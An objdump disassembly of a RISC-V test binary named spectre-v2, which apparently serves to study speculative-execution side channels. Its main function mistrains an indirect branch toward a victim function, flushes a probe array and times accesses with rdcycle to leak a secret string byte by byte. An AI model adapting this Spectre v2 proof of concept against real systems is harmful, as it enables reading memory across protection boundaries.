
bin/spectre-v2.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text:

00000000000100b0 <register_fini>:
   100b0:	ffff0797          	auipc	a5,0xffff0
   100b4:	f5078793          	addi	a5,a5,-176 # 0 <register_fini-0x100b0>
   100b8:	c799                	beqz	a5,100c6 <register_fini+0x16>
   100ba:	00003517          	auipc	a0,0x3
   100be:	b8250513          	addi	a0,a0,-1150 # 12c3c <__libc_fini_array>
   100c2:	3bb0906f          	j	19c7c <atexit>
   100c6:	8082                	ret

00000000000100c8 <_start>:
   100c8:	00010197          	auipc	gp,0x10
   100cc:	ce018193          	addi	gp,gp,-800 # 1fda8 <__global_pointer$>
   100d0:	86818513          	addi	a0,gp,-1944 # 1f610 <_edata>
   100d4:	00028617          	auipc	a2,0x28
   100d8:	e4c60613          	addi	a2,a2,-436 # 37f20 <__BSS_END__>
   100dc:	8e09                	sub	a2,a2,a0
   100de:	4581                	li	a1,0
   100e0:	680000ef          	jal	ra,10760 <memset>
   100e4:	0000a517          	auipc	a0,0xa
   100e8:	b9850513          	addi	a0,a0,-1128 # 19c7c <atexit>
   100ec:	c519                	beqz	a0,100fa <_start+0x32>
   100ee:	00003517          	auipc	a0,0x3
   100f2:	b4e50513          	addi	a0,a0,-1202 # 12c3c <__libc_fini_array>
   100f6:	387090ef          	jal	ra,19c7c <atexit>
   100fa:	5fc000ef          	jal	ra,106f6 <__libc_init_array>
   100fe:	4502                	lw	a0,0(sp)
   10100:	002c                	addi	a1,sp,8
   10102:	4601                	li	a2,0
   10104:	26c000ef          	jal	ra,10370 <main>
   10108:	abc1                	j	106d8 <exit>

000000000001010a <__do_global_dtors_aux>:
   1010a:	89018793          	addi	a5,gp,-1904 # 1f638 <completed.5527>
   1010e:	0007c703          	lbu	a4,0(a5)
   10112:	eb0d                	bnez	a4,10144 <__do_global_dtors_aux+0x3a>
   10114:	1141                	addi	sp,sp,-16
   10116:	e022                	sd	s0,0(sp)
   10118:	e406                	sd	ra,8(sp)
   1011a:	843e                	mv	s0,a5
   1011c:	ffff0797          	auipc	a5,0xffff0
   10120:	ee478793          	addi	a5,a5,-284 # 0 <register_fini-0x100b0>
   10124:	cb89                	beqz	a5,10136 <__do_global_dtors_aux+0x2c>
   10126:	0000e517          	auipc	a0,0xe
   1012a:	2c250513          	addi	a0,a0,706 # 1e3e8 <__FRAME_END__>
   1012e:	00000097          	auipc	ra,0x0
   10132:	000000e7          	jalr	zero # 0 <register_fini-0x100b0>
   10136:	4785                	li	a5,1
   10138:	60a2                	ld	ra,8(sp)
   1013a:	00f40023          	sb	a5,0(s0)
   1013e:	6402                	ld	s0,0(sp)
   10140:	0141                	addi	sp,sp,16
   10142:	8082                	ret
   10144:	8082                	ret

0000000000010146 <frame_dummy>:
   10146:	ffff0797          	auipc	a5,0xffff0
   1014a:	eba78793          	addi	a5,a5,-326 # 0 <register_fini-0x100b0>
   1014e:	cb99                	beqz	a5,10164 <frame_dummy+0x1e>
   10150:	89818593          	addi	a1,gp,-1896 # 1f640 <object.5532>
   10154:	0000e517          	auipc	a0,0xe
   10158:	29450513          	addi	a0,a0,660 # 1e3e8 <__FRAME_END__>
   1015c:	00000317          	auipc	t1,0x0
   10160:	00000067          	jr	zero # 0 <register_fini-0x100b0>
   10164:	8082                	ret

0000000000010166 <flushCache>:
   10166:	711d                	addi	sp,sp,-96
   10168:	eca2                	sd	s0,88(sp)
   1016a:	1080                	addi	s0,sp,96
   1016c:	faa43423          	sd	a0,-88(s0)
   10170:	fab43023          	sd	a1,-96(s0)
   10174:	fa043783          	ld	a5,-96(s0)
   10178:	8399                	srli	a5,a5,0x6
   1017a:	fef43423          	sd	a5,-24(s0)
   1017e:	fa043783          	ld	a5,-96(s0)
   10182:	03f7f793          	andi	a5,a5,63
   10186:	c791                	beqz	a5,10192 <flushCache+0x2c>
   10188:	fe843783          	ld	a5,-24(s0)
   1018c:	0785                	addi	a5,a5,1
   1018e:	fef43423          	sd	a5,-24(s0)
   10192:	fe843703          	ld	a4,-24(s0)
   10196:	04000793          	li	a5,64
   1019a:	00e7f663          	bgeu	a5,a4,101a6 <flushCache+0x40>
   1019e:	04000793          	li	a5,64
   101a2:	fef43423          	sd	a5,-24(s0)
   101a6:	fc040ba3          	sb	zero,-41(s0)
   101aa:	000207b7          	lui	a5,0x20
   101ae:	e9878713          	addi	a4,a5,-360 # 1fe98 <dummyMem>
   101b2:	6791                	lui	a5,0x4
   101b4:	973e                	add	a4,a4,a5
   101b6:	77fd                	lui	a5,0xfffff
   101b8:	8ff9                	and	a5,a5,a4
   101ba:	fcf43423          	sd	a5,-56(s0)
   101be:	fe043023          	sd	zero,-32(s0)
   101c2:	a8b9                	j	10220 <flushCache+0xba>
   101c4:	fa843783          	ld	a5,-88(s0)
   101c8:	8399                	srli	a5,a5,0x6
   101ca:	03f7f713          	andi	a4,a5,63
   101ce:	fe043783          	ld	a5,-32(s0)
   101d2:	97ba                	add	a5,a5,a4
   101d4:	079a                	slli	a5,a5,0x6
   101d6:	fcf43023          	sd	a5,-64(s0)
   101da:	fc043c23          	sd	zero,-40(s0)
   101de:	a03d                	j	1020c <flushCache+0xa6>
   101e0:	fd843783          	ld	a5,-40(s0)
   101e4:	07b2                	slli	a5,a5,0xc
   101e6:	faf43c23          	sd	a5,-72(s0)
   101ea:	fc843703          	ld	a4,-56(s0)
   101ee:	fc043783          	ld	a5,-64(s0)
   101f2:	973e                	add	a4,a4,a5
   101f4:	fb843783          	ld	a5,-72(s0)
   101f8:	97ba                	add	a5,a5,a4
   101fa:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <__BSS_END__+0xfffffffffffc70e0>
   101fe:	fcf40ba3          	sb	a5,-41(s0)
   10202:	fd843783          	ld	a5,-40(s0)
   10206:	0785                	addi	a5,a5,1
   10208:	fcf43c23          	sd	a5,-40(s0)
   1020c:	fd843703          	ld	a4,-40(s0)
   10210:	47bd                	li	a5,15
   10212:	fce7f7e3          	bgeu	a5,a4,101e0 <flushCache+0x7a>
   10216:	fe043783          	ld	a5,-32(s0)
   1021a:	0785                	addi	a5,a5,1
   1021c:	fef43023          	sd	a5,-32(s0)
   10220:	fe043703          	ld	a4,-32(s0)
   10224:	fe843783          	ld	a5,-24(s0)
   10228:	f8f76ee3          	bltu	a4,a5,101c4 <flushCache+0x5e>
   1022c:	0001                	nop
   1022e:	0001                	nop
   10230:	6466                	ld	s0,88(sp)
   10232:	6125                	addi	sp,sp,96
   10234:	8082                	ret

0000000000010236 <topTwoIdx>:
   10236:	7139                	addi	sp,sp,-64
   10238:	fc22                	sd	s0,56(sp)
   1023a:	0080                	addi	s0,sp,64
   1023c:	fca43c23          	sd	a0,-40(s0)
   10240:	fcb43823          	sd	a1,-48(s0)
   10244:	fcc43423          	sd	a2,-56(s0)
   10248:	fcd43023          	sd	a3,-64(s0)
   1024c:	fc043783          	ld	a5,-64(s0)
   10250:	0007b023          	sd	zero,0(a5)
   10254:	fc043783          	ld	a5,-64(s0)
   10258:	07a1                	addi	a5,a5,8
   1025a:	0007b023          	sd	zero,0(a5)
   1025e:	fe043423          	sd	zero,-24(s0)
   10262:	a075                	j	1030e <topTwoIdx+0xd8>
   10264:	fe843783          	ld	a5,-24(s0)
   10268:	078e                	slli	a5,a5,0x3
   1026a:	fd843703          	ld	a4,-40(s0)
   1026e:	97ba                	add	a5,a5,a4
   10270:	6398                	ld	a4,0(a5)
   10272:	fc043783          	ld	a5,-64(s0)
   10276:	639c                	ld	a5,0(a5)
   10278:	04e7f563          	bgeu	a5,a4,102c2 <topTwoIdx+0x8c>
   1027c:	fc043783          	ld	a5,-64(s0)
   10280:	07a1                	addi	a5,a5,8
   10282:	fc043703          	ld	a4,-64(s0)
   10286:	6318                	ld	a4,0(a4)
   10288:	e398                	sd	a4,0(a5)
   1028a:	fe843783          	ld	a5,-24(s0)
   1028e:	078e                	slli	a5,a5,0x3
   10290:	fd843703          	ld	a4,-40(s0)
   10294:	97ba                	add	a5,a5,a4
   10296:	6398                	ld	a4,0(a5)
   10298:	fc043783          	ld	a5,-64(s0)
   1029c:	e398                	sd	a4,0(a5)
   1029e:	fc843783          	ld	a5,-56(s0)
   102a2:	0785                	addi	a5,a5,1
   102a4:	fc843703          	ld	a4,-56(s0)
   102a8:	00074703          	lbu	a4,0(a4)
   102ac:	00e78023          	sb	a4,0(a5)
   102b0:	fe843783          	ld	a5,-24(s0)
   102b4:	0ff7f713          	andi	a4,a5,255
   102b8:	fc843783          	ld	a5,-56(s0)
   102bc:	00e78023          	sb	a4,0(a5)
   102c0:	a091                	j	10304 <topTwoIdx+0xce>
   102c2:	fe843783          	ld	a5,-24(s0)
   102c6:	078e                	slli	a5,a5,0x3
   102c8:	fd843703          	ld	a4,-40(s0)
   102cc:	97ba                	add	a5,a5,a4
   102ce:	6398                	ld	a4,0(a5)
   102d0:	fc043783          	ld	a5,-64(s0)
   102d4:	07a1                	addi	a5,a5,8
   102d6:	639c                	ld	a5,0(a5)
   102d8:	02e7f663          	bgeu	a5,a4,10304 <topTwoIdx+0xce>
   102dc:	fe843783          	ld	a5,-24(s0)
   102e0:	078e                	slli	a5,a5,0x3
   102e2:	fd843703          	ld	a4,-40(s0)
   102e6:	973e                	add	a4,a4,a5
   102e8:	fc043783          	ld	a5,-64(s0)
   102ec:	07a1                	addi	a5,a5,8
   102ee:	6318                	ld	a4,0(a4)
   102f0:	e398                	sd	a4,0(a5)
   102f2:	fc843783          	ld	a5,-56(s0)
   102f6:	0785                	addi	a5,a5,1
   102f8:	fe843703          	ld	a4,-24(s0)
   102fc:	0ff77713          	andi	a4,a4,255
   10300:	00e78023          	sb	a4,0(a5)
   10304:	fe843783          	ld	a5,-24(s0)
   10308:	0785                	addi	a5,a5,1
   1030a:	fef43423          	sd	a5,-24(s0)
   1030e:	fe843703          	ld	a4,-24(s0)
   10312:	fd043783          	ld	a5,-48(s0)
   10316:	f4f767e3          	bltu	a4,a5,10264 <topTwoIdx+0x2e>
   1031a:	0001                	nop
   1031c:	0001                	nop
   1031e:	7462                	ld	s0,56(sp)
   10320:	6121                	addi	sp,sp,64
   10322:	8082                	ret

0000000000010324 <wantFunc>:
   10324:	1141                	addi	sp,sp,-16
   10326:	e422                	sd	s0,8(sp)
   10328:	0800                	addi	s0,sp,16
   1032a:	0001                	nop
   1032c:	0001                	nop
   1032e:	6422                	ld	s0,8(sp)
   10330:	0141                	addi	sp,sp,16
   10332:	8082                	ret

0000000000010334 <victimFunc>:
   10334:	7179                	addi	sp,sp,-48
   10336:	f422                	sd	s0,40(sp)
   10338:	1800                	addi	s0,sp,48
   1033a:	fca43c23          	sd	a0,-40(s0)
   1033e:	67f9                	lui	a5,0x1e
   10340:	40878713          	addi	a4,a5,1032 # 1e408 <__fini_array_end>
   10344:	fd843783          	ld	a5,-40(s0)
   10348:	97ba                	add	a5,a5,a4
   1034a:	0007c783          	lbu	a5,0(a5)
   1034e:	2781                	sext.w	a5,a5
   10350:	0067979b          	slliw	a5,a5,0x6
   10354:	2781                	sext.w	a5,a5
   10356:	00034737          	lui	a4,0x34
   1035a:	ed870713          	addi	a4,a4,-296 # 33ed8 <array2>
   1035e:	97ba                	add	a5,a5,a4
   10360:	0007c783          	lbu	a5,0(a5)
   10364:	fef407a3          	sb	a5,-17(s0)
   10368:	0001                	nop
   1036a:	7422                	ld	s0,40(sp)
   1036c:	6145                	addi	sp,sp,48
   1036e:	8082                	ret

0000000000010370 <main>:
   10370:	7131                	addi	sp,sp,-192
   10372:	fd06                	sd	ra,184(sp)
   10374:	f922                	sd	s0,176(sp)
   10376:	0180                	addi	s0,sp,192
   10378:	67c1                	lui	a5,0x10
   1037a:	32478793          	addi	a5,a5,804 # 10324 <wantFunc>
   1037e:	faf43423          	sd	a5,-88(s0)
   10382:	67c1                	lui	a5,0x10
   10384:	33478793          	addi	a5,a5,820 # 10334 <victimFunc>
   10388:	faf43023          	sd	a5,-96(s0)
   1038c:	8481b703          	ld	a4,-1976(gp) # 1f5f0 <secretString>
   10390:	67f9                	lui	a5,0x1e
   10392:	40878793          	addi	a5,a5,1032 # 1e408 <__fini_array_end>
   10396:	40f707b3          	sub	a5,a4,a5
   1039a:	fef43423          	sd	a5,-24(s0)
   1039e:	fe0403a3          	sb	zero,-25(s0)
   103a2:	67f1                	lui	a5,0x1c
   103a4:	5d078513          	addi	a0,a5,1488 # 1c5d0 <__clzdi2+0x50>
   103a8:	530000ef          	jal	ra,108d8 <puts>
   103ac:	8481b783          	ld	a5,-1976(gp) # 1f5f0 <secretString>
   103b0:	85be                	mv	a1,a5
   103b2:	67f1                	lui	a5,0x1c
   103b4:	60878513          	addi	a0,a5,1544 # 1c608 <__clzdi2+0x88>
   103b8:	474000ef          	jal	ra,1082c <printf>
   103bc:	fc043c23          	sd	zero,-40(s0)
   103c0:	a609                	j	106c2 <main+0x352>
   103c2:	fc043823          	sd	zero,-48(s0)
   103c6:	a005                	j	103e6 <main+0x76>
   103c8:	0001f7b7          	lui	a5,0x1f
   103cc:	67078713          	addi	a4,a5,1648 # 1f670 <results.2601>
   103d0:	fd043783          	ld	a5,-48(s0)
   103d4:	078e                	slli	a5,a5,0x3
   103d6:	97ba                	add	a5,a5,a4
   103d8:	0007b023          	sd	zero,0(a5)
   103dc:	fd043783          	ld	a5,-48(s0)
   103e0:	0785                	addi	a5,a5,1
   103e2:	fcf43823          	sd	a5,-48(s0)
   103e6:	fd043703          	ld	a4,-48(s0)
   103ea:	0ff00793          	li	a5,255
   103ee:	fce7fde3          	bgeu	a5,a4,103c8 <main+0x58>
   103f2:	fc043423          	sd	zero,-56(s0)
   103f6:	a275                	j	105a2 <main+0x232>
   103f8:	000347b7          	lui	a5,0x34
   103fc:	ed878793          	addi	a5,a5,-296 # 33ed8 <array2>
   10400:	6591                	lui	a1,0x4
   10402:	853e                	mv	a0,a5
   10404:	d63ff0ef          	jal	ra,10166 <flushCache>
   10408:	4799                	li	a5,6
   1040a:	fcf43023          	sd	a5,-64(s0)
   1040e:	a0f5                	j	104fa <main+0x18a>
   10410:	fc043703          	ld	a4,-64(s0)
   10414:	479d                	li	a5,7
   10416:	02f767b3          	rem	a5,a4,a5
   1041a:	17fd                	addi	a5,a5,-1
   1041c:	873e                	mv	a4,a5
   1041e:	77c1                	lui	a5,0xffff0
   10420:	8ff9                	and	a5,a5,a4
   10422:	f6f43c23          	sd	a5,-136(s0)
   10426:	f7843783          	ld	a5,-136(s0)
   1042a:	83c1                	srli	a5,a5,0x10
   1042c:	f7843703          	ld	a4,-136(s0)
   10430:	8fd9                	or	a5,a5,a4
   10432:	f6f43c23          	sd	a5,-136(s0)
   10436:	fa843703          	ld	a4,-88(s0)
   1043a:	fa043783          	ld	a5,-96(s0)
   1043e:	8f3d                	xor	a4,a4,a5
   10440:	f7843783          	ld	a5,-136(s0)
   10444:	8ff9                	and	a5,a5,a4
   10446:	fa043703          	ld	a4,-96(s0)
   1044a:	8fb9                	xor	a5,a5,a4
   1044c:	f6f43c23          	sd	a5,-136(s0)
   10450:	8401b783          	ld	a5,-1984(gp) # 1f5e8 <array1_sz>
   10454:	fc843703          	ld	a4,-56(s0)
   10458:	02f777b3          	remu	a5,a4,a5
   1045c:	f6f43823          	sd	a5,-144(s0)
   10460:	fc043703          	ld	a4,-64(s0)
   10464:	479d                	li	a5,7
   10466:	02f767b3          	rem	a5,a4,a5
   1046a:	17fd                	addi	a5,a5,-1
   1046c:	873e                	mv	a4,a5
   1046e:	77c1                	lui	a5,0xffff0
   10470:	8ff9                	and	a5,a5,a4
   10472:	f6f43423          	sd	a5,-152(s0)
   10476:	f6843783          	ld	a5,-152(s0)
   1047a:	83c1                	srli	a5,a5,0x10
   1047c:	f6843703          	ld	a4,-152(s0)
   10480:	8fd9                	or	a5,a5,a4
   10482:	f6f43423          	sd	a5,-152(s0)
   10486:	fe843703          	ld	a4,-24(s0)
   1048a:	f7043783          	ld	a5,-144(s0)
   1048e:	8f3d                	xor	a4,a4,a5
   10490:	f6843783          	ld	a5,-152(s0)
   10494:	8ff9                	and	a5,a5,a4
   10496:	f7043703          	ld	a4,-144(s0)
   1049a:	8fb9                	xor	a5,a5,a4
   1049c:	f6f43423          	sd	a5,-152(s0)
   104a0:	fa043c23          	sd	zero,-72(s0)
   104a4:	a031                	j	104b0 <main+0x140>
   104a6:	fb843783          	ld	a5,-72(s0)
   104aa:	0785                	addi	a5,a5,1
   104ac:	faf43c23          	sd	a5,-72(s0)
   104b0:	fb843703          	ld	a4,-72(s0)
   104b4:	47f5                	li	a5,29
   104b6:	fee7f8e3          	bgeu	a5,a4,104a6 <main+0x136>
   104ba:	f7843783          	ld	a5,-136(s0)
   104be:	f6843703          	ld	a4,-152(s0)
   104c2:	17f9                	addi	a5,a5,-2
   104c4:	00200313          	li	t1,2
   104c8:	00431393          	slli	t2,t1,0x4
   104cc:	d0337753          	fcvt.s.lu	fa4,t1
   104d0:	d033f7d3          	fcvt.s.lu	fa5,t2
   104d4:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   104d8:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   104dc:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   104e0:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   104e4:	c03793d3          	fcvt.lu.s	t2,fa5,rtz
   104e8:	979e                	add	a5,a5,t2
   104ea:	853a                	mv	a0,a4
   104ec:	000780e7          	jalr	a5 # ffffffffffff0000 <__BSS_END__+0xfffffffffffb80e0>
   104f0:	fc043783          	ld	a5,-64(s0)
   104f4:	17fd                	addi	a5,a5,-1
   104f6:	fcf43023          	sd	a5,-64(s0)
   104fa:	fc043783          	ld	a5,-64(s0)
   104fe:	f007d9e3          	bgez	a5,10410 <main+0xa0>
   10502:	fa043823          	sd	zero,-80(s0)
   10506:	a059                	j	1058c <main+0x21c>
   10508:	c00027f3          	rdcycle	a5
   1050c:	f8f43c23          	sd	a5,-104(s0)
   10510:	f9843783          	ld	a5,-104(s0)
   10514:	f8f43823          	sd	a5,-112(s0)
   10518:	fb043783          	ld	a5,-80(s0)
   1051c:	079a                	slli	a5,a5,0x6
   1051e:	00034737          	lui	a4,0x34
   10522:	ed870713          	addi	a4,a4,-296 # 33ed8 <array2>
   10526:	97ba                	add	a5,a5,a4
   10528:	0007c703          	lbu	a4,0(a5)
   1052c:	fe744783          	lbu	a5,-25(s0)
   10530:	8ff9                	and	a5,a5,a4
   10532:	fef403a3          	sb	a5,-25(s0)
   10536:	c00027f3          	rdcycle	a5
   1053a:	f8f43423          	sd	a5,-120(s0)
   1053e:	f8843703          	ld	a4,-120(s0)
   10542:	f9043783          	ld	a5,-112(s0)
   10546:	40f707b3          	sub	a5,a4,a5
   1054a:	f8f43023          	sd	a5,-128(s0)
   1054e:	f8043703          	ld	a4,-128(s0)
   10552:	03100793          	li	a5,49
   10556:	02e7e663          	bltu	a5,a4,10582 <main+0x212>
   1055a:	0001f7b7          	lui	a5,0x1f
   1055e:	67078713          	addi	a4,a5,1648 # 1f670 <results.2601>
   10562:	fb043783          	ld	a5,-80(s0)
   10566:	078e                	slli	a5,a5,0x3
   10568:	97ba                	add	a5,a5,a4
   1056a:	639c                	ld	a5,0(a5)
   1056c:	00178713          	addi	a4,a5,1
   10570:	0001f7b7          	lui	a5,0x1f
   10574:	67078693          	addi	a3,a5,1648 # 1f670 <results.2601>
   10578:	fb043783          	ld	a5,-80(s0)
   1057c:	078e                	slli	a5,a5,0x3
   1057e:	97b6                	add	a5,a5,a3
   10580:	e398                	sd	a4,0(a5)
   10582:	fb043783          	ld	a5,-80(s0)
   10586:	0785                	addi	a5,a5,1
   10588:	faf43823          	sd	a5,-80(s0)
   1058c:	fb043703          	ld	a4,-80(s0)
   10590:	0ff00793          	li	a5,255
   10594:	f6e7fae3          	bgeu	a5,a4,10508 <main+0x198>
   10598:	fc843783          	ld	a5,-56(s0)
   1059c:	0785                	addi	a5,a5,1
   1059e:	fcf43423          	sd	a5,-56(s0)
   105a2:	fc843703          	ld	a4,-56(s0)
   105a6:	47a5                	li	a5,9
   105a8:	e4e7f8e3          	bgeu	a5,a4,103f8 <main+0x88>
   105ac:	f6041023          	sh	zero,-160(s0)
   105b0:	f4043823          	sd	zero,-176(s0)
   105b4:	f4043c23          	sd	zero,-168(s0)
   105b8:	f5040713          	addi	a4,s0,-176
   105bc:	f6040793          	addi	a5,s0,-160
   105c0:	86ba                	mv	a3,a4
   105c2:	863e                	mv	a2,a5
   105c4:	10000593          	li	a1,256
   105c8:	0001f7b7          	lui	a5,0x1f
   105cc:	67078513          	addi	a0,a5,1648 # 1f670 <results.2601>
   105d0:	c67ff0ef          	jal	ra,10236 <topTwoIdx>
   105d4:	f6044683          	lbu	a3,-160(s0)
   105d8:	8481b703          	ld	a4,-1976(gp) # 1f5f0 <secretString>
   105dc:	fd843783          	ld	a5,-40(s0)
   105e0:	97ba                	add	a5,a5,a4
   105e2:	0007c783          	lbu	a5,0(a5)
   105e6:	8736                	mv	a4,a3
   105e8:	00f70e63          	beq	a4,a5,10604 <main+0x294>
   105ec:	f6144683          	lbu	a3,-159(s0)
   105f0:	8481b703          	ld	a4,-1976(gp) # 1f5f0 <secretString>
   105f4:	fd843783          	ld	a5,-40(s0)
   105f8:	97ba                	add	a5,a5,a4
   105fa:	0007c783          	lbu	a5,0(a5)
   105fe:	8736                	mv	a4,a3
   10600:	04f71d63          	bne	a4,a5,1065a <main+0x2ea>
   10604:	fe843703          	ld	a4,-24(s0)
   10608:	67f9                	lui	a5,0x1e
   1060a:	40878793          	addi	a5,a5,1032 # 1e408 <__fini_array_end>
   1060e:	00f705b3          	add	a1,a4,a5
   10612:	8481b703          	ld	a4,-1976(gp) # 1f5f0 <secretString>
   10616:	fd843783          	ld	a5,-40(s0)
   1061a:	97ba                	add	a5,a5,a4
   1061c:	0007c783          	lbu	a5,0(a5)
   10620:	0007861b          	sext.w	a2,a5
   10624:	f5043683          	ld	a3,-176(s0)
   10628:	f6044783          	lbu	a5,-160(s0)
   1062c:	0007871b          	sext.w	a4,a5
   10630:	f6044783          	lbu	a5,-160(s0)
   10634:	0007851b          	sext.w	a0,a5
   10638:	f5843803          	ld	a6,-168(s0)
   1063c:	f6144783          	lbu	a5,-159(s0)
   10640:	0007889b          	sext.w	a7,a5
   10644:	f6144783          	lbu	a5,-159(s0)
   10648:	2781                	sext.w	a5,a5
   1064a:	e03e                	sd	a5,0(sp)
   1064c:	87aa                	mv	a5,a0
   1064e:	6571                	lui	a0,0x1c
   10650:	62050513          	addi	a0,a0,1568 # 1c620 <__clzdi2+0xa0>
   10654:	1d8000ef          	jal	ra,1082c <printf>
   10658:	a899                	j	106ae <main+0x33e>
   1065a:	fe843703          	ld	a4,-24(s0)
   1065e:	67f9                	lui	a5,0x1e
   10660:	40878793          	addi	a5,a5,1032 # 1e408 <__fini_array_end>
   10664:	00f705b3          	add	a1,a4,a5
   10668:	8481b703          	ld	a4,-1976(gp) # 1f5f0 <secretString>
   1066c:	fd843783          	ld	a5,-40(s0)
   10670:	97ba                	add	a5,a5,a4
   10672:	0007c783          	lbu	a5,0(a5)
   10676:	0007861b          	sext.w	a2,a5
   1067a:	f5043683          	ld	a3,-176(s0)
   1067e:	f6044783          	lbu	a5,-160(s0)
   10682:	0007871b          	sext.w	a4,a5
   10686:	f6044783          	lbu	a5,-160(s0)
   1068a:	0007851b          	sext.w	a0,a5
   1068e:	f5843803          	ld	a6,-168(s0)
   10692:	f6144783          	lbu	a5,-159(s0)
   10696:	0007889b          	sext.w	a7,a5
   1069a:	f6144783          	lbu	a5,-159(s0)
   1069e:	2781                	sext.w	a5,a5
   106a0:	e03e                	sd	a5,0(sp)
   106a2:	87aa                	mv	a5,a0
   106a4:	6571                	lui	a0,0x1c
   106a6:	68050513          	addi	a0,a0,1664 # 1c680 <__clzdi2+0x100>
   106aa:	182000ef          	jal	ra,1082c <printf>
   106ae:	fe843783          	ld	a5,-24(s0)
   106b2:	0785                	addi	a5,a5,1
   106b4:	fef43423          	sd	a5,-24(s0)
   106b8:	fd843783          	ld	a5,-40(s0)
   106bc:	0785                	addi	a5,a5,1
   106be:	fcf43c23          	sd	a5,-40(s0)
   106c2:	fd843703          	ld	a4,-40(s0)
   106c6:	47e5                	li	a5,25
   106c8:	cee7fde3          	bgeu	a5,a4,103c2 <main+0x52>
   106cc:	4781                	li	a5,0
   106ce:	853e                	mv	a0,a5
   106d0:	70ea                	ld	ra,184(sp)
   106d2:	744a                	ld	s0,176(sp)
   106d4:	6129                	addi	sp,sp,192
   106d6:	8082                	ret

00000000000106d8 <exit>:
   106d8:	1141                	addi	sp,sp,-16
   106da:	4581                	li	a1,0
   106dc:	e022                	sd	s0,0(sp)
   106de:	e406                	sd	ra,8(sp)
   106e0:	842a                	mv	s0,a0
   106e2:	03c020ef          	jal	ra,1271e <__call_exitprocs>
   106e6:	8301b503          	ld	a0,-2000(gp) # 1f5d8 <_global_impure_ptr>
   106ea:	6d3c                	ld	a5,88(a0)
   106ec:	c391                	beqz	a5,106f0 <exit+0x18>
   106ee:	9782                	jalr	a5
   106f0:	8522                	mv	a0,s0
   106f2:	0bf0a0ef          	jal	ra,1afb0 <_exit>

00000000000106f6 <__libc_init_array>:
   106f6:	1101                	addi	sp,sp,-32
   106f8:	e822                	sd	s0,16(sp)
   106fa:	e04a                	sd	s2,0(sp)
   106fc:	0000e417          	auipc	s0,0xe
   10700:	cf040413          	addi	s0,s0,-784 # 1e3ec <__preinit_array_end>
   10704:	0000e917          	auipc	s2,0xe
   10708:	ce890913          	addi	s2,s2,-792 # 1e3ec <__preinit_array_end>
   1070c:	40890933          	sub	s2,s2,s0
   10710:	ec06                	sd	ra,24(sp)
   10712:	e426                	sd	s1,8(sp)
   10714:	40395913          	srai	s2,s2,0x3
   10718:	00090963          	beqz	s2,1072a <__libc_init_array+0x34>
   1071c:	4481                	li	s1,0
   1071e:	601c                	ld	a5,0(s0)
   10720:	0485                	addi	s1,s1,1
   10722:	0421                	addi	s0,s0,8
   10724:	9782                	jalr	a5
   10726:	fe991ce3          	bne	s2,s1,1071e <__libc_init_array+0x28>
   1072a:	0000e417          	auipc	s0,0xe
   1072e:	cc640413          	addi	s0,s0,-826 # 1e3f0 <__init_array_start>
   10732:	0000e917          	auipc	s2,0xe
   10736:	cce90913          	addi	s2,s2,-818 # 1e400 <__init_array_end>
   1073a:	40890933          	sub	s2,s2,s0
   1073e:	40395913          	srai	s2,s2,0x3
   10742:	00090963          	beqz	s2,10754 <__libc_init_array+0x5e>
   10746:	4481                	li	s1,0
   10748:	601c                	ld	a5,0(s0)
   1074a:	0485                	addi	s1,s1,1
   1074c:	0421                	addi	s0,s0,8
   1074e:	9782                	jalr	a5
   10750:	fe991ce3          	bne	s2,s1,10748 <__libc_init_array+0x52>
   10754:	60e2                	ld	ra,24(sp)
   10756:	6442                	ld	s0,16(sp)
   10758:	64a2                	ld	s1,8(sp)
   1075a:	6902                	ld	s2,0(sp)
   1075c:	6105                	addi	sp,sp,32
   1075e:	8082                	ret

0000000000010760 <memset>:
   10760:	433d                	li	t1,15
   10762:	872a                	mv	a4,a0
   10764:	02c37163          	bgeu	t1,a2,10786 <memset+0x26>
   10768:	00f77793          	andi	a5,a4,15
   1076c:	e3c1                	bnez	a5,107ec <memset+0x8c>
   1076e:	e1bd                	bnez	a1,107d4 <memset+0x74>
   10770:	ff067693          	andi	a3,a2,-16
   10774:	8a3d                	andi	a2,a2,15
   10776:	96ba                	add	a3,a3,a4
   10778:	e30c                	sd	a1,0(a4)
   1077a:	e70c                	sd	a1,8(a4)
   1077c:	0741                	addi	a4,a4,16
   1077e:	fed76de3          	bltu	a4,a3,10778 <memset+0x18>
   10782:	e211                	bnez	a2,10786 <memset+0x26>
   10784:	8082                	ret
   10786:	40c306b3          	sub	a3,t1,a2
   1078a:	068a                	slli	a3,a3,0x2
   1078c:	00000297          	auipc	t0,0x0
   10790:	9696                	add	a3,a3,t0
   10792:	00a68067          	jr	10(a3)
   10796:	00b70723          	sb	a1,14(a4)
   1079a:	00b706a3          	sb	a1,13(a4)
   1079e:	00b70623          	sb	a1,12(a4)
   107a2:	00b705a3          	sb	a1,11(a4)
   107a6:	00b70523          	sb	a1,10(a4)
   107aa:	00b704a3          	sb	a1,9(a4)
   107ae:	00b70423          	sb	a1,8(a4)
   107b2:	00b703a3          	sb	a1,7(a4)
   107b6:	00b70323          	sb	a1,6(a4)
   107ba:	00b702a3          	sb	a1,5(a4)
   107be:	00b70223          	sb	a1,4(a4)
   107c2:	00b701a3          	sb	a1,3(a4)
   107c6:	00b70123          	sb	a1,2(a4)
   107ca:	00b700a3          	sb	a1,1(a4)
   107ce:	00b70023          	sb	a1,0(a4)
   107d2:	8082                	ret
   107d4:	0ff5f593          	andi	a1,a1,255
   107d8:	00859693          	slli	a3,a1,0x8
   107dc:	8dd5                	or	a1,a1,a3
   107de:	01059693          	slli	a3,a1,0x10
   107e2:	8dd5                	or	a1,a1,a3
   107e4:	02059693          	slli	a3,a1,0x20
   107e8:	8dd5                	or	a1,a1,a3
   107ea:	b759                	j	10770 <memset+0x10>
   107ec:	00279693          	slli	a3,a5,0x2
   107f0:	00000297          	auipc	t0,0x0
   107f4:	9696                	add	a3,a3,t0
   107f6:	8286                	mv	t0,ra
   107f8:	fa2680e7          	jalr	-94(a3)
   107fc:	8096                	mv	ra,t0
   107fe:	17c1                	addi	a5,a5,-16
   10800:	8f1d                	sub	a4,a4,a5
   10802:	963e                	add	a2,a2,a5
   10804:	f8c371e3          	bgeu	t1,a2,10786 <memset+0x26>
   10808:	b79d                	j	1076e <memset+0xe>

000000000001080a <_printf_r>:
   1080a:	715d                	addi	sp,sp,-80
